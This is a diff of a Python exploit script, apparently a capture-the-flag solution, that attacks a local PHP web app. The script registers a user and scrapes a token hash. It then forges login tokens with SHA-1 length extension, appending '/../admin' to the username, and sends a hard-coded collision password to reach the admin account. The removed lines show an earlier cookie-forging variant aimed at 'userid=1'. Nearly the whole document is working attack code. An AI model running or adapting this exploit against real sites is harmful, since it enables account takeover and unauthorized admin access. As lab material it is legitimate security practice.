@@ -1,4 +1,6 @@
 import base64
+import random
+import re
 import urllib.parse
 
 import requests
@@ -12,38 +14,41 @@ def decode_session_cookie(cookie_value):
 
     return pld, hsh
 
+
 def encode_session_cookie(pld, hsh):
     pld = base64.b64encode(pld).decode()
     hsh = base64.b64encode(hsh).decode()
 
     return urllib.parse.quote(pld) + "." + urllib.parse.quote(hsh)
 
-s = requests.Session()
-r = s.post('http://localhost:8008/register.php', data={'username': 'someuser', 'password': 'someuser', 'passport': '1234'})
-r = s.post('http://localhost:8008/login.php', data={'username': 'someuser', 'password': 'someuser'})
 
+s = requests.Session()
+username = 'someuser' + str(random.randint(0, 10000))
+print(username)
+r = s.post('http://localhost:8008/register.php',
+           data={'username': username, 'password': 'someuser', 'passport': '1234'})
 if r.status_code != 200:
     print(r.text)
     exit(1)
 
+regex = r"<b>'(.*)'</b>"
+print(r.text)
+tok_hash = re.findall(regex, r.text)[0]
+
 sess_value = s.cookies.get('mursession')
 print(sess_value)
 
-pld, hsh = decode_session_cookie(sess_value)
-
-new_cookie_value = sess_value
 for salt_size in range(1, 30):
     sha_hl = hle_new('sha1')
-    extended = sha_hl.extend(b'|userid=1', pld.encode(), salt_size, hsh)
-    new_value = encode_session_cookie(extended, sha_hl.hexdigest().encode())
-    r = requests.get('http://localhost:8008/index.php', cookies={'mursession': new_value}, allow_redirects=False)
-    if r.status_code == 200:
-        print(r.text)
-        new_cookie_value = new_value
-        break
-
-r = requests.post('http://localhost:8008/passport.php', cookies={'mursession': new_cookie_value},
-                  # Collision for ''
-                  data={'password': b'^\xd0\xb8\x93\xf1\x0c\x08\x8c\xcf\x0e\x00{\xf6\xed\xbfa'})
-
-print(r.text)
+    extended = sha_hl.extend(b'/../admin', username.encode(), salt_size, tok_hash)
+    r = requests.post('http://localhost:8008/login.php', allow_redirects=True,
+                      data={'username': extended,
+                            'token': sha_hl.hexdigest(),
+                            'password': b'^\xd0\xb8\x93\xf1\x0c\x08\x8c\xcf\x0e\x00{\xf6\xed\xbfa'})
+    if 'Invalid' in r.text:
+        continue
+    print(r.text)
+    break
+else:
+    print("Failed to exploit")
+    exit(1)
